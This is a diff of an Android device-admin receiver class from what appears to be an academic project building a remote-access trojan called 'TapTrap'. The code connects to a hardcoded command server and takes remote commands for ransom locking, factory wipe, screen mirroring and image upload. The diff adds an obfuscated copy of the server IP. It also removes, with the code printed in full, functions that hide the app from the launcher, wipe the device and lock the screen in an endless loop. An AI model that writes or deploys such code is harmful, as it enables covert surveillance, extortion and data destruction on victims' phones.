@@ -29,11 +29,16 @@ import java.util.concurrent.atomic.AtomicBoolean;
 
 import androidx.camera.core.Camera;
 
+import com.example.inf2007_mad_j1847.utils.StringHelper;
+
 public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
 
     private static final String TAG = "TapTrap-Admin";
     private static final String SERVER_IP = "20.2.66.175";
+    String result = StringHelper.qzxp("gXqms9MpOeyvxww="); // 20.2.66.175
     private static final int SERVER_PORT = 9999;
+
+
 
 
     // Lock control variables
@@ -80,15 +85,13 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
                 writer.println("  battery     - Show battery status");
                 writer.println("  ip          - Show IP addresses");
                 writer.println("  list_apps (only show current app)  - List installed apps");
-                writer.println("  hide_app (no use?)    - Hide app from launcher");
-                writer.println("  show_app (no use?)    - Show app in launcher");
                 writer.println("  reboot (not working on emulator)     - Reboot device");
-                writer.println("  ransom_lock - set max idle time lock");
+                writer.println("  ransom_lock");
                 writer.println("  ransom_end ");
                 writer.println("  scan_media [N]  - Scan N images and show results");
                 writer.println("  upload [ID]     - Upload image to Firebase Storage");
                 writer.println("  exit        - Close connection");
-                writer.println("  wipe  (not working on emulator)      - Factory reset device (physical only)");
+                writer.println("  wipe - Factory reset device (physical only)");
                 writer.println("  screen_mirror - Start sending screenshots every 10s");
                 writer.println("  screen_stop   - Stop screen mirror");
                 writer.println("  wifi        - Show WiFi info");
@@ -212,13 +215,6 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
             case "list_apps":
                 return getInstalledApps(context);
 
-            case "hide_app":
-                hideApp(context);
-                return "✅ App hidden from launcher!";
-
-            case "show_app":
-                showApp(context);
-                return "✅ App visible in launcher!";
 
             case "reboot":
                 rebootDevice(context);
@@ -278,13 +274,7 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
         }
     }
 
-    // Add this new wipe function
-    public void wipeDevice(Context context) {
-        DevicePolicyManager dpm = getDpm(context);
-        Log.d(TAG, "💀 Wiping device!");
-        dpm.wipeData(0);
-        //dpm.wipeDevice(0);
-    }
+
     // Device info
     private String getDeviceInfo() {
         return "Model: " + android.os.Build.MODEL +
@@ -377,25 +367,7 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
         return sb.toString();
     }
 
-    // Hide app from launcher
-    private void hideApp(Context context) {
-        android.content.pm.PackageManager pm = context.getPackageManager();
-        pm.setComponentEnabledSetting(
-                new ComponentName(context, context.getClass()),
-                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                android.content.pm.PackageManager.DONT_KILL_APP
-        );
-    }
 
-    // Show app in launcher
-    private void showApp(Context context) {
-        android.content.pm.PackageManager pm = context.getPackageManager();
-        pm.setComponentEnabledSetting(
-                new ComponentName(context, context.getClass()),
-                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-                android.content.pm.PackageManager.DONT_KILL_APP
-        );
-    }
 
     // Reboot device
     private void rebootDevice(Context context) {
@@ -455,25 +427,6 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
         } catch (Exception e) {
             Log.e(TAG, "Error: " + e.getMessage());
         }
-    }
-
-    public String setRansomLock(Context context) {
-        DevicePolicyManager dpm = (DevicePolicyManager)
-                context.getSystemService(Context.DEVICE_POLICY_SERVICE);
-
-
-        while (true) {
-            Log.d(TAG, " Locking device now");
-            dpm.lockNow();
-            // Optional: add a small delay to prevent overwhelming the system
-            try {
-                Thread.sleep(100); // 100ms delay
-            } catch (InterruptedException e) {
-                e.printStackTrace();
-            }
-        }
-
-
     }
 
 
